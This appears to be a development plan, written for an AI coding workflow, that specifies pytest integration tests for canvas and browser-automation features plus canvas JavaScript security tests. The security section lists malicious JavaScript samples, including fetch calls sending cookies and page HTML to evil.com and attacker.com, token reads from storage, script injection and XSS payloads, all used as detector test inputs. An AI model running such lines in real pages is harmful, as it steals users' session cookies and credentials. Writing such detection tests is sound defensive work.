---
phase: 03-integration-security-tests
plan: 05
type: execute
wave: 2
depends_on: ["03-01"]
files_modified:
  - backend/tests/integration/test_canvas_integration.py
  - backend/tests/integration/test_browser_integration.py
  - backend/tests/security/test_canvas_security.py
autonomous: true

must_haves:
  truths:
    - Canvas presentations (forms, charts, sheets) integrate correctly
    - Browser automation with Playwright CDP works end-to-end
    - Canvas JavaScript components require AUTONOMOUS agents
    - Custom canvas components are validated for security
    - Browser sessions are properly governed
  artifacts:
    - path: backend/tests/integration/test_canvas_integration.py
      contains: "test_canvas"
      min_lines: 200
    - path: backend/tests/integration/test_browser_integration.py
      contains: "test_browser"
      min_lines: 150
    - path: backend/tests/security/test_canvas_security.py
      contains: "javascript"
      min_lines: 150
  key_links:
    - from: backend/tests/integration/test_canvas_integration.py
      to: backend/api/canvas_routes.py
      pattern: "canvas"
    - from: backend/tests/integration/test_browser_integration.py
      to: backend/api/browser_routes.py
      pattern: "browser"
    - from: backend/tests/security/test_canvas_security.py
      to: backend/api/custom_components.py
      pattern: "javascript"
---
<objective>
Create integration tests for canvas presentations and browser automation, plus canvas JavaScript security tests.

Purpose: Test canvas presentation integration (forms, charts, sheets) as required by INTG-06, browser automation integration as required by INTG-07, and canvas JavaScript security validation as required by SECU-04.

Output: Integration test files for canvas and browser automation, plus security tests for canvas JavaScript.
</objective>

<execution_context>
@/Users/rushiparikh/.claude/get-shit-done/workflows/execute-plan.md
@/Users/rushiparikh/.claude/get-shit-done/templates/summary.md
</execution_context>

<context>
@.planning/PROJECT.md
@.planning/ROADMAP.md
@.planning/REQUIREMENTS.md
@.planning/phases/03-integration-security-tests/03-RESEARCH.md

@backend/api/canvas_routes.py
@backend/api/browser_routes.py
@backend/api/custom_components.py
@backend/tools/canvas_tool.py
@backend/tools/browser_tool.py
@backend/tests/factories/canvas_factory.py
@backend/tests/factories/agent_factory.py
</context>

<tasks>

<task type="auto">
  <name>Create canvas presentation integration tests (INTG-06)</name>
  <files>backend/tests/integration/test_canvas_integration.py</files>
  <action>
    Create comprehensive canvas presentation integration tests:

    Test cases covering:
    - Canvas creation and presentation
    - Form submission with governance
    - Chart rendering (line, bar, pie)
    - Sheet (spreadsheet) operations
    - Canvas audit trail creation
    - WebSocket updates for canvas interactions
    - Multi-agent canvas coordination

    ```python
    """
    Canvas presentation integration tests (INTG-06).

    Tests cover:
    - Canvas creation and presentation
    - Form submissions with governance
    - Chart rendering
    - Sheet operations
    - Canvas audit trail
    - Multi-agent coordination
    """
    import pytest
    from fastapi.testclient import TestClient
    from sqlalchemy.orm import Session
    from tests.factories.canvas_factory import CanvasFactory
    from tests.factories.agent_factory import StudentAgentFactory, AutonomousAgentFactory
    from tests.factories.user_factory import UserFactory
    from core.models import CanvasAudit, AgentRegistry

    class TestCanvasCreation:
        """Test canvas creation and presentation."""

        def test_create_canvas_requires_authentication(self, client: TestClient):
            """Test canvas creation requires authentication."""
            response = client.post("/api/canvas/create", json={
                "type": "generic",
                "title": "Test Canvas"
            })

            assert response.status_code == 401

        def test_create_canvas_with_valid_token(self, client: TestClient, auth_token: str):
            """Test canvas creation with valid authentication."""
            response = client.post(
                "/api/canvas/create",
                json={
                    "type": "generic",
                    "title": "Test Canvas",
                    "data": {"message": "Hello World"}
                },
                headers={"Authorization": f"Bearer {auth_token}"}
            )

            assert response.status_code in [201, 200]
            data = response.json()
            assert "canvas_id" in data or "id" in data

        def test_present_canvas_with_agent(self, client: TestClient, auth_token: str, db_session: Session):
            """Test presenting canvas through agent."""
            agent = AutonomousAgentFactory()
            canvas = CanvasFactory(canvas_type="generic")
            db_session.add_all([agent, canvas])
            db_session.commit()

            response = client.post(
                f"/api/canvas/{canvas.id}/present",
                json={"agent_id": agent.id},
                headers={"Authorization": f"Bearer {auth_token}"}
            )

            assert response.status_code in [200, 202]

            # Verify audit trail created
            audit = db_session.query(CanvasAudit).filter(
                CanvasAudit.canvas_id == canvas.id
            ).first()
            assert audit is not None
            assert audit.action == "present"

    class TestCanvasForms:
        """Test canvas form submissions."""

        def test_form_submit_requires_authentication(self, client: TestClient):
            """Test form submission requires authentication."""
            response = client.post("/api/canvas/submit", json={
                "canvas_id": "test-canvas",
                "form_data": {"field1": "value1"}
            })

            assert response.status_code == 401

        def test_form_submit_with_valid_data(self, client: TestClient, auth_token: str, db_session: Session):
            """Test form submission with valid data."""
            canvas = CanvasFactory(
                canvas_type="form",
                component_name="test_form"
            )
            db_session.add(canvas)
            db_session.commit()

            response = client.post(
                "/api/canvas/submit",
                json={
                    "canvas_id": canvas.id,
                    "form_data": {
                        "name": "Test User",
                        "email": "test@example.com"
                    }
                },
                headers={"Authorization": f"Bearer {auth_token}"}
            )

            assert response.status_code in [200, 201, 202]

        def test_form_submit_with_agent_governance(self, client: TestClient, auth_token: str, db_session: Session):
            """Test form submission with agent governance validation."""
            student = StudentAgentFactory()
            canvas = CanvasFactory(canvas_type="form")
            db_session.add_all([student, canvas])
            db_session.commit()

            # STUDENT agent should be blocked from form submission (complexity 3)
            response = client.post(
                "/api/canvas/submit",
                json={
                    "canvas_id": canvas.id,
                    "form_data": {"field1": "value1"},
                    "agent_id": student.id
                },
                headers={"Authorization": f"Bearer {auth_token}"}
            )

            # Should require SUPERVISED+ for form submissions
            assert response.status_code in [403, 202]  # Blocked or requires approval

    class TestCanvasCharts:
        """Test canvas chart rendering."""

        def test_chart_creation(self, client: TestClient, auth_token: str, db_session: Session):
            """Test creating chart canvas."""
            response = client.post(
                "/api/canvas/create",
                json={
                    "type": "chart",
                    "chart_type": "line",
                    "title": "Test Chart",
                    "data": {
                        "labels": ["Jan", "Feb", "Mar"],
                        "datasets": [{"data": [10, 20, 30]}]
                    }
                },
                headers={"Authorization": f"Bearer {auth_token}"}
            )

            assert response.status_code in [201, 200]

        def test_chart_data_validation(self, client: TestClient, auth_token: str):
            """Test chart data is validated."""
            # Missing required data
            response = client.post(
                "/api/canvas/create",
                json={
                    "type": "chart",
                    "chart_type": "line",
                    "title": "Invalid Chart"
                    # Missing data field
                },
                headers={"Authorization": f"Bearer {auth_token}"}
            )

            assert response.status_code in [400, 422]

        def test_supported_chart_types(self, client: TestClient, auth_token: str):
            """Test all supported chart types."""
            chart_types = ["line", "bar", "pie", "doughnut"]

            for chart_type in chart_types:
                response = client.post(
                    "/api/canvas/create",
                    json={
                        "type": "chart",
                        "chart_type": chart_type,
                        "title": f"{chart_type} chart",
                        "data": {
                            "labels": ["A", "B"],
                            "datasets": [{"data": [1, 2]}]
                        }
                    },
                    headers={"Authorization": f"Bearer {auth_token}"}
                )

                assert response.status_code in [201, 200], \
                    f"Chart type {chart_type} failed"

    class TestCanvasSheets:
        """Test canvas sheet (spreadsheet) operations."""

        def test_sheet_creation(self, client: TestClient, auth_token: str):
            """Test creating sheet canvas."""
            response = client.post(
                "/api/canvas/create",
                json={
                    "type": "sheet",
                    "title": "Test Sheet",
                    "data": {
                        "rows": [
                            ["Name", "Value"],
                            ["Row 1", 100],
                            ["Row 2", 200]
                        ]
                    }
                },
                headers={"Authorization": f"Bearer {auth_token}"}
            )

            assert response.status_code in [201, 200]

        def test_sheet_cell_update(self, client: TestClient, auth_token: str, db_session: Session):
            """Test updating sheet cell."""
            sheet = CanvasFactory(
                canvas_type="sheet",
                audit_metadata={"data": {"rows": [["A1", "B1"]]}}
            )
            db_session.add(sheet)
            db_session.commit()

            response = client.post(
                f"/api/canvas/sheet/{sheet.id}/update",
                json={
                    "cell": "A1",
                    "value": "Updated Value"
                },
                headers={"Authorization": f"Bearer {auth_token}"}
            )

            assert response.status_code in [200, 202]

    class TestCanvasAuditTrail:
        """Test canvas audit trail."""

        def test_canvas_action_creates_audit(self, client: TestClient, auth_token: str, db_session: Session):
            """Test canvas actions create audit entries."""
            canvas = CanvasFactory(canvas_type="generic")
            db_session.add(canvas)
            db_session.commit()

            # Present canvas
            client.post(
                f"/api/canvas/{canvas.id}/present",
                headers={"Authorization": f"Bearer {auth_token}"}
            )

            # Verify audit created
            audits = db_session.query(CanvasAudit).filter(
                CanvasAudit.canvas_id == canvas.id
            ).all()

            assert len(audits) > 0
            assert audits[0].action == "present"

        def test_canvas_audit_includes_agent_context(self, client: TestClient, auth_token: str, db_session: Session):
            """Test canvas audit includes agent context."""
            agent = AutonomousAgentFactory()
            canvas = CanvasFactory(canvas_type="generic")
            db_session.add_all([agent, canvas])
            db_session.commit()

            client.post(
                f"/api/canvas/{canvas.id}/present",
                json={"agent_id": agent.id},
                headers={"Authorization": f"Bearer {auth_token}"}
            )

            audit = db_session.query(CanvasAudit).filter(
                CanvasAudit.canvas_id == canvas.id
            ).first()

            assert audit is not None
            assert audit.agent_id == agent.id

    class TestMultiAgentCanvasCoordination:
        """Test multi-agent canvas collaboration."""

        def test_sequential_agent_collaboration(self, client: TestClient, auth_token: str, db_session: Session):
            """Test sequential agent collaboration on canvas."""
            agent1 = AutonomousAgentFactory(name="Agent 1")
            agent2 = AutonomousAgentFactory(name="Agent 2")
            canvas = CanvasFactory(canvas_type="orchestration")
            db_session.add_all([agent1, agent2, canvas])
            db_session.commit()

            # Agent 1 presents
            response1 = client.post(
                f"/api/canvas/{canvas.id}/present",
                json={"agent_id": agent1.id},
                headers={"Authorization": f"Bearer {auth_token}"}
            )
            assert response1.status_code in [200, 202]

            # Agent 2 presents on same canvas
            response2 = client.post(
                f"/api/canvas/{canvas.id}/present",
                json={"agent_id": agent2.id},
                headers={"Authorization": f"Bearer {auth_token}"}
            )
            assert response2.status_code in [200, 202]

            # Verify both agents in audit
            audits = db_session.query(CanvasAudit).filter(
                CanvasAudit.canvas_id == canvas.id
            ).all()

            agent_ids = [a.agent_id for a in audits]
            assert agent1.id in agent_ids
            assert agent2.id in agent_ids

        def test_canvas_locking_for_concurrent_edits(self, client: TestClient, auth_token: str, db_session: Session):
            """Test canvas locking prevents concurrent edit conflicts."""
            canvas = CanvasFactory(canvas_type="sheet")
            db_session.add(canvas)
            db_session.commit()

            # Acquire lock
            response1 = client.post(
                f"/api/canvas/{canvas.id}/lock",
                headers={"Authorization": f"Bearer {auth_token}"}
            )

            # Try to acquire lock again (should fail or return same lock)
            response2 = client.post(
                f"/api/canvas/{canvas.id}/lock",
                headers={"Authorization": f"Bearer {auth_token}"}
            )

            # Second lock attempt should be handled
            assert response2.status_code in [200, 409]  # OK or Conflict
    ```

    Ensure tests cover:
    - Canvas creation and presentation
    - Form submissions with governance
    - Chart types (line, bar, pie, doughnut)
    - Sheet operations
    - Audit trail creation
    - Multi-agent collaboration
  </action>
  <verify>grep -c "def test_" backend/tests/integration/test_canvas_integration.py</verify>
  <done>
    At least 15 test methods covering canvas operations
    Tests use CanvasFactory and AgentFactory
    Tests validate audit trail creation
    Tests cover multi-agent coordination
  </done>
</task>

<task type="auto">
  <name>Create browser automation integration tests (INTG-07)</name>
  <files>backend/tests/integration/test_browser_integration.py</files>
  <action>
    Create browser automation integration tests for Playwright CDP sessions:

    Test cases covering:
    - Browser session creation and management
    - Navigation and screenshot
    - Form filling
    - Governance checks (INTERN+ required for browser actions)
    - Browser audit trail
    - Session cleanup

    ```python
    """
    Browser automation integration tests (INTG-07).

    Tests cover:
    - Browser session creation (Playwright CDP)
    - Navigation and screenshot
    - Form filling
    - Governance enforcement (INTERN+ required)
    - Browser audit trail
    - Session cleanup
    """
    import pytest
    from fastapi.testclient import TestClient
    from sqlalchemy.orm import Session
    from tests.factories.agent_factory import StudentAgentFactory, InternAgentFactory
    from tests.factories.user_factory import UserFactory
    from unittest.mock import Mock, AsyncMock, patch

    class TestBrowserSessionCreation:
        """Test browser session creation and management."""

        def test_create_browser_session_requires_authentication(self, client: TestClient):
            """Test browser session creation requires authentication."""
            response = client.post("/api/browser/create", json={
                "browser_type": "chromium",
                "headless": True
            })

            assert response.status_code == 401

        @patch('tools.browser_tool.playwright.async_api')
        def test_create_browser_session_success(self, mock_playwright, client: TestClient, auth_token: str):
            """Test successful browser session creation."""
            # Mock Playwright browser
            mock_browser = AsyncMock()
            mock_context = AsyncMock()
            mock_page = AsyncMock()
            mock_context.new_page.return_value = mock_page
            mock_browser.new_context.return_value = mock_context
            mock_playwright.chromium.launch.return_value = mock_browser

            response = client.post(
                "/api/browser/create",
                json={
                    "browser_type": "chromium",
                    "headless": True
                },
                headers={"Authorization": f"Bearer {auth_token}"}
            )

            assert response.status_code in [201, 200]
            data = response.json()
            assert "session_id" in data or "id" in data

        def test_browser_session_governance_student_blocked(self, client: TestClient, auth_token: str, db_session: Session):
            """Test STUDENT agent blocked from browser automation."""
            student = StudentAgentFactory()
            db_session.add(student)
            db_session.commit()

            response = client.post(
                "/api/browser/create",
                json={
                    "agent_id": student.id,
                    "browser_type": "chromium"
                },
                headers={"Authorization": f"Bearer {auth_token}"}
            )

            # STUDENT blocked from browser (requires INTERN+)
            assert response.status_code == 403
            assert "browser" in response.json()["detail"].lower() or \
                   "intern" in response.json()["detail"].lower()

    class TestBrowserNavigation:
        """Test browser navigation operations."""

        @patch('tools.browser_tool.playwright.async_api')
        def test_navigate_to_url(self, mock_playwright, client: TestClient, auth_token: str):
            """Test navigating to a URL."""
            # Mock browser page
            mock_page = AsyncMock()
            mock_page.goto.return_value = None
            mock_page.url = "https://example.com"

            # Setup mock chain
            mock_playwright.chromium.launch.return_value.new_context.return_value.new_page.return_value = mock_page

            response = client.post(
                "/api/browser/navigate",
                json={
                    "session_id": "test-session",
                    "url": "https://example.com"
                },
                headers={"Authorization": f"Bearer {auth_token}"}
            )

            assert response.status_code in [200, 202]

        @patch('tools.browser_tool.playwright.async_api')
        def test_navigate_blocks_invalid_url(self, mock_playwright, client: TestClient, auth_token: str):
            """Test navigation blocks invalid URLs."""
            response = client.post(
                "/api/browser/navigate",
                json={
                    "session_id": "test-session",
                    "url": "not-a-valid-url"
                },
                headers={"Authorization": f"Bearer {auth_token}"}
            )

            assert response.status_code in [400, 422]

    class TestBrowserScreenshot:
        """Test browser screenshot functionality."""

        @patch('tools.browser_tool.playwright.async_api')
        def test_take_screenshot(self, mock_playwright, client: TestClient, auth_token: str):
            """Test taking a screenshot."""
            # Mock screenshot
            mock_page = AsyncMock()
            mock_page.screenshot.return_value = b"fake_screenshot_data"

            response = client.post(
                "/api/browser/screenshot",
                json={
                    "session_id": "test-session",
                    "full_page": False
                },
                headers={"Authorization": f"Bearer {auth_token}"}
            )

            assert response.status_code == 200
            data = response.json()
            assert "screenshot" in data or "data" in data

    class TestBrowserFormFilling:
        """Test browser form filling."""

        @patch('tools.browser_tool.playwright.async_api')
        def test_fill_form(self, mock_playwright, client: TestClient, auth_token: str):
            """Test filling a form."""
            mock_page = AsyncMock()
            mock_page.fill.return_value = None
            mock_page.select_option.return_value = None

            response = client.post(
                "/api/browser/fill_form",
                json={
                    "session_id": "test-session",
                    "fields": {
                        "#name": "Test User",
                        "#email": "test@example.com",
                        "select#country": "US"
                    }
                },
                headers={"Authorization": f"Bearer {auth_token}"}
            )

            assert response.status_code in [200, 202]

    class TestBrowserAuditTrail:
        """Test browser audit trail."""

        def test_browser_action_creates_audit(self, client: TestClient, auth_token: str, db_session: Session):
            """Test browser actions create audit entries."""
            from core.models import BrowserSession

            # Create browser session (mocked)
            # Perform action
            # Verify audit created

            # This test requires actual session creation or mocking
            pass

    class TestBrowserSessionCleanup:
        """Test browser session cleanup."""

        @patch('tools.browser_tool.playwright.async_api')
        def test_close_browser_session(self, mock_playwright, client: TestClient, auth_token: str):
            """Test closing browser session."""
            mock_browser = AsyncMock()
            mock_browser.close.return_value = None

            response = client.post(
                "/api/browser/close",
                json={"session_id": "test-session"},
                headers={"Authorization": f"Bearer {auth_token}"}
            )

            assert response.status_code in [200, 204]

        def test_session_timeout_cleanup(self, client: TestClient, auth_token: str):
            """Test inactive sessions are cleaned up."""
            # This would test the session timeout mechanism
            pass

    class TestBrowserGovernance:
        """Test browser governance enforcement."""

        def test_intern_agent_can_use_browser(self, client: TestClient, auth_token: str, db_session: Session):
            """Test INTERN agent can use browser automation."""
            intern = InternAgentFactory()
            db_session.add(intern)
            db_session.commit()

            with patch('tools.browser_tool.playwright.async_api'):
                response = client.post(
                    "/api/browser/create",
                    json={
                        "agent_id": intern.id,
                        "browser_type": "chromium"
                    },
                    headers={"Authorization": f"Bearer {auth_token}"}
                )

                # INTERN should be allowed for browser
                assert response.status_code not in [403]
    ```

    Ensure tests cover:
    - Browser session creation with governance
    - Navigation and screenshot
    - Form filling
    - Audit trail
    - Session cleanup
    - Mock Playwright to avoid actual browser launch in tests
  </action>
  <verify>grep -c "def test_" backend/tests/integration/test_browser_integration.py</verify>
  <done>
    At least 10 test methods covering browser operations
    Tests use mocking for Playwright CDP
    Tests validate governance (INTERN+ required)
    Tests cover session lifecycle
  </done>
</task>

<task type="auto">
  <name>Create canvas JavaScript security tests (SECU-04)</name>
  <files>backend/tests/security/test_canvas_security.py</files>
  <action>
    Create canvas JavaScript security validation tests:

    Test cases covering:
    - JavaScript components require AUTONOMOUS agents
    - Malicious JavaScript patterns are detected
    - HTML/CSS components have lower requirements
    - Static analysis for dangerous patterns
    - JavaScript execution validation

    ```python
    """
    Canvas JavaScript security tests (SECU-04).

    Tests cover:
    - JavaScript components require AUTONOMOUS agents
    - Malicious JavaScript pattern detection
    - HTML/CSS component security
    - Static analysis validation
    """
    import pytest
    from fastapi.testclient import TestClient
    from sqlalchemy.orm import Session
    from tests.factories.agent_factory import StudentAgentFactory, InternAgentFactory, SupervisedAgentFactory, AutonomousAgentFactory
    from tests.factories.user_factory import UserFactory

    # Malicious JavaScript payloads
    MALICIOUS_JS_PATTERNS = [
        # Fetch exfiltration
        "fetch('https://evil.com/steal?data='+document.cookie)",
        "fetch('http://attacker.com/log', {body: document.body.innerHTML})",

        # eval() execution
        "eval(atob('YWxlcnQoJ1hTUycp'))",
        "eval(userInput)",

        # Document cookie access
        "document.cookie",
        "document['cookie']",

        # window.location manipulation
        "window.location='https://evil.com'",
        "window.location.href = 'https://phishing.com'",

        # postMessage exfiltration
        "window.postMessage(document.cookie, '*')",

        # localStorage/sessionStorage access
        "localStorage.getItem('token')",
        "sessionStorage['password']",

        # DOM manipulation
        "document.body.innerHTML = xhr.responseText",
        "document.write('<script>alert(1)</script>')",

        # Dynamic script creation
        "var s = document.createElement('script'); s.src = 'evil.js'; document.head.appendChild(s)",
    ]

    SAFE_HTML_PATTERNS = [
        "<div class='container'>Content</div>",
        "<p>Paragraph with <strong>bold</strong> text</p>",
        "<h1>Heading</h1>",
        "<ul><li>List item</li></ul>",
        "<span class='label'>Label</span>",
    ]

    class TestJavaScriptGovernance:
        """Test JavaScript component governance."""

        def test_student_cannot_create_js_component(self, client: TestClient, auth_token: str, db_session: Session):
            """Test STUDENT agent blocked from JavaScript components."""
            student = StudentAgentFactory()
            db_session.add(student)
            db_session.commit()

            response = client.post(
                "/api/canvas/custom-component",
                json={
                    "name": "Test Component",
                    "html": "<div>Hello</div>",
                    "css": ".test { color: red; }",
                    "javascript": "console.log('test');",
                    "agent_id": student.id
                },
                headers={"Authorization": f"Bearer {auth_token}"}
            )

            assert response.status_code == 403
            data = response.json()
            assert "javascript" in data.get("detail", "").lower() or \
                   "autonomous" in data.get("detail", "").lower()

        def test_intern_cannot_create_js_component(self, client: TestClient, auth_token: str, db_session: Session):
            """Test INTERN agent blocked from JavaScript components."""
            intern = InternAgentFactory()
            db_session.add(intern)
            db_session.commit()

            response = client.post(
                "/api/canvas/custom-component",
                json={
                    "name": "Test Component",
                    "html": "<div>Hello</div>",
                    "javascript": "console.log('test');",
                    "agent_id": intern.id
                },
                headers={"Authorization": f"Bearer {auth_token}"}
            )

            assert response.status_code == 403

        def test_supervised_cannot_create_js_component(self, client: TestClient, auth_token: str, db_session: Session):
            """Test SUPERVISED agent blocked from JavaScript components."""
            supervised = SupervisedAgentFactory()
            db_session.add(supervised)
            db_session.commit()

            response = client.post(
                "/api/canvas/custom-component",
                json={
                    "name": "Test Component",
                    "html": "<div>Hello</div>",
                    "javascript": "console.log('test');",
                    "agent_id": supervised.id
                },
                headers={"Authorization": f"Bearer {auth_token}"}
            )

            assert response.status_code == 403

        def test_autonomous_can_create_js_component(self, client: TestClient, auth_token: str, db_session: Session):
            """Test AUTONOMOUS agent can create JavaScript components."""
            autonomous = AutonomousAgentFactory()
            db_session.add(autonomous)
            db_session.commit()

            response = client.post(
                "/api/canvas/custom-component",
                json={
                    "name": "Test Component",
                    "html": "<div>Hello</div>",
                    "javascript": "console.log('test');",
                    "agent_id": autonomous.id
                },
                headers={"Authorization": f"Bearer {auth_token}"}
            )

            assert response.status_code not in [403]

    class TestMaliciousJavaScriptDetection:
        """Test detection of malicious JavaScript patterns."""

        @pytest.mark.parametrize("malicious_code", MALICIOUS_JS_PATTERNS)
        def test_malicious_patterns_blocked(self, client: TestClient, admin_token: str, malicious_code):
            """Test malicious JavaScript patterns are blocked."""
            response = client.post(
                "/api/canvas/custom-component",
                json={
                    "name": "Test Component",
                    "html": "<div>Safe</div>",
                    "javascript": malicious_code
                },
                headers={"Authorization": f"Bearer {admin_token}"}
            )

            # Should either block or flag for review
            # For AUTONOMOUS agents, might allow with warning
            # For lower maturity, should block
            assert response.status_code in [400, 403, 202]

            if response.status_code in [400, 403]:
                data = response.json()
                assert any(term in str(data).lower() for term in [
                    "malicious", "security", "blocked", "pattern", "dangerous"
                ])

        def test_detect_fetch_exfiltration(self, client: TestClient, admin_token: str):
            """Test detection of fetch-based data exfiltration."""
            malicious = "fetch('https://evil.com?c='+document.cookie)"

            response = client.post(
                "/api/canvas/validate-javascript",
                json={"javascript": malicious},
                headers={"Authorization": f"Bearer {admin_token}"}
            )

            # Should flag as dangerous
            assert response.status_code == 200
            data = response.json()
            assert data.get("safe") == False
            assert "exfiltration" in str(data.get("reason", "")).lower() or \
                   "fetch" in str(data.get("reason", "")).lower()

        def test_detect_eval_usage(self, client: TestClient, admin_token: str):
            """Test detection of eval() usage."""
            malicious = "eval(userInput)"

            response = client.post(
                "/api/canvas/validate-javascript",
                json={"javascript": malicious},
                headers={"Authorization": f"Bearer {admin_token}"}
            )

            data = response.json()
            assert data.get("safe") == False
            assert "eval" in str(data.get("reason", "")).lower()

    class TestSafeHTMLComponents:
        """Test safe HTML/CSS components."""

        def test_html_components_lower_governance(self, client: TestClient, auth_token: str, db_session: Session):
            """Test HTML components have lower governance requirements."""
            # STUDENT agents can use HTML/CSS (read-only presentation)
            student = StudentAgentFactory()
            db_session.add(student)
            db_session.commit()

            safe_html = "<div class='container'><p>Safe content</p></div>"
            safe_css = ".container { padding: 10px; }"

            response = client.post(
                "/api/canvas/custom-component",
                json={
                    "name": "HTML Component",
                    "html": safe_html,
                    "css": safe_css,
                    "component_type": "html",
                    "agent_id": student.id
                },
                headers={"Authorization": f"Bearer {auth_token}"}
            )

            # HTML/CSS should be allowed for STUDENT (presentation only)
            assert response.status_code not in [403]

        @pytest.mark.parametrize("safe_html", SAFE_HTML_PATTERNS)
        def test_safe_html_allowed(self, client: TestClient, admin_token: str, safe_html):
            """Test safe HTML patterns are allowed."""
            response = client.post(
                "/api/canvas/custom-component",
                json={
                    "name": "Safe Component",
                    "html": safe_html,
                    "css": ".safe { color: blue; }"
                },
                headers={"Authorization": f"Bearer {admin_token}"}
            )

            assert response.status_code not in [400, 403]

    class TestJavaScriptStaticAnalysis:
        """Test static analysis for JavaScript security."""

        def test_static_analysis_detects_dangerous_apis(self, client: TestClient, admin_token: str):
            """Test static analysis detects dangerous APIs."""
            dangerous_apis = [
                "eval()",
                "Function()",
                "document.write()",
                "window.location =",
                "document.cookie",
                "window.postMessage()",
                "localStorage.",
                "sessionStorage.",
            ]

            for api in dangerous_apis:
                code = f"// Using {api}\n{api.replace('()', '(\"test\")')};"

                response = client.post(
                    "/api/canvas/validate-javascript",
                    json={"javascript": code},
                    headers={"Authorization": f"Bearer {admin_token}"}
                )

                data = response.json()
                # Should flag as potentially dangerous
                assert "safe" in data  # Should have safety assessment

        def test_static_analysis_allows_safe_patterns(self, client: TestClient, admin_token: str):
            """Test static analysis allows safe patterns."""
            safe_patterns = [
                "console.log('debug');",
                "const x = 5;",
                "function add(a, b) { return a + b; }",
                "document.querySelector('.test');",
                "element.classList.add('active');",
                "Array.from(items).map(x => x.id);",
            ]

            for code in safe_patterns:
                response = client.post(
                    "/api/canvas/validate-javascript",
                    json={"javascript": code},
                    headers={"Authorization": f"Bearer {admin_token}"}
                )

                data = response.json()
                assert data.get("safe") != False, f"Safe pattern blocked: {code}"

    class TestCanvasXSSPrevention:
        """Test XSS prevention in canvas rendering."""

        def test_canvas_escaping_on_render(self, client: TestClient, admin_token: str):
            """Test canvas content is escaped when rendering."""
            xss_payload = "<script>alert('XSS')</script>"

            response = client.post(
                "/api/canvas/render",
                json={
                    "type": "generic",
                    "content": xss_payload
                },
                headers={"Authorization": f"Bearer {admin_token}"}
            )

            if response.status_code == 200:
                # Content should be escaped
                assert "<script>" not in response.text
                assert "&lt;script&gt;" in response.text or "escaped" in response.text.lower()

        def test_component_name_sanitization(self, client: TestClient, admin_token: str):
            """Test component names are sanitized."""
            xss_name = "<script>alert('XSS')</script>Component"

            response = client.post(
                "/api/canvas/custom-component",
                json={
                    "name": xss_name,
                    "html": "<div>Safe</div>"
                },
                headers={"Authorization": f"Bearer {admin_token}"}
            )

            if response.status_code in [200, 201]:
                data = response.json()
                # Name should be sanitized
                assert "<script>" not in data.get("name", "")
    ```

    Ensure tests cover:
    - JavaScript governance (AUTONOMOUS only)
    - Malicious pattern detection (fetch, eval, cookie access)
    - Safe HTML/CSS with lower requirements
    - Static analysis for dangerous APIs
    - XSS prevention in rendering
  </action>
  <verify>grep -c "def test_" backend/tests/security/test_canvas_security.py</verify>
  <done>
    At least 15 test methods covering JavaScript security
    Tests validate governance for JavaScript components
    Tests include malicious JavaScript pattern detection
    Tests cover XSS prevention and static analysis
  </done>
</task>

</tasks>

<verification>
After completion:
1. Run canvas integration tests: pytest backend/tests/integration/test_canvas_integration.py -v
2. Run browser integration tests: pytest backend/tests/integration/test_browser_integration.py -v
3. Run canvas security tests: pytest backend/tests/security/test_canvas_security.py -v
4. Verify Playwright mocking works without real browser
5. Verify JavaScript governance enforcement
</verification>

<success_criteria>
1. Canvas integration tests created (INTG-06)
2. Browser integration tests created (INTG-07)
3. Canvas JavaScript security tests created (SECU-04)
4. At least 40 test methods created across 3 files
5. Tests use mocking for Playwright CDP
6. JavaScript governance validated (AUTONOMOUS only)
</success_criteria>

<output>
After completion, create `.planning/phases/03-integration-security-tests/03-05-SUMMARY.md`
</output>
